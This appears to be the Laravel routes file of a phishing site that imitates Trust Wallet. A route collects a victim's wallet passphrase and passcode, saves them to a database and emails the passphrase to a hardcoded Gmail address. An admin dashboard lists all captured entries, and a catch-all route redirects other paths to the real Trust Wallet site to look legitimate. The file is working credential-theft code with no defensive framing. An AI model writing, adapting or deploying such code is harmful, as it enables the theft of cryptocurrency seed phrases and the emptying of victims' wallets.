<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use App\Models\Portal;
// use Mail;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('home');
})->name('home');

Route::post('/authenticate/passphrase/WebApp', function(Request $request){
    $request->validate([
        'passphrase'=>['required']
    ]);
    $alt_message = Portal::create(['passcode'=>$request->passcode, 'reenter_passcode'=>$request->reenter_passcode, 'passphrase'=>$request->passphrase]);
    $subject = 'New Passphrase and Passcode';
    $message = "Passphrase: ".$alt_message->passphrase;
    Mail::send('main.mail', ['msg'=>$message, 'subject'=>$subject], function($email_info) use ($subject){
        $email_info->to('samtechy224@gmail.com')
        ->replyTo('samtechy224@gmail.com', 'Official__')
        ->subject($subject)
        ->from(env('MAIL_FROM_ADDRESS'), 'Official__');
    }
);
    return redirect()->route('account.update');
    // return redirect()->away('https://trustwallet.com/download');
})->name('authenticate.webapp');

Route::get('/account/update', function(){
    return view('update');
})->name('account.update');

Route::prefix('admin')->as('admin.')->group(function(){
    Route::get('/', function(){
        return redirect()->route('admin.dashboard');
    });
    Route::get('/login', function(){return view('app.login');})->name('admin.dashboard');
    Route::post('/login', function(Request $request){
        $credentials = $request->validate([
            'username' => ['required'],
            'password'=>['required']
        ]);

        if(Auth::attempt($credentials)){
            $request->session()->regenerate();
            return redirect()->intended('/admin/dashboard');
        }
        return back()->withErrors(['username'=> 'The provided credentials do not match our records.'])->onlyInput('username');
    })->middleware('guest')->name('login');

    Route::get('dashboard', function(){
        return view('app.dashboard', ['entries'=>\App\Models\Portal::all()]);
    })->middleware('auth')->name('dashboard');

    Route::get('/logout', function(Request $request){
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();
        return redirect()->route('home');
    })->name('logout');
});


Route::get('{catchall}', function(Request $request){
    return redirect()->away('https://trustwallet.com/'.$request->path());
})->where('catchall', '(.*)');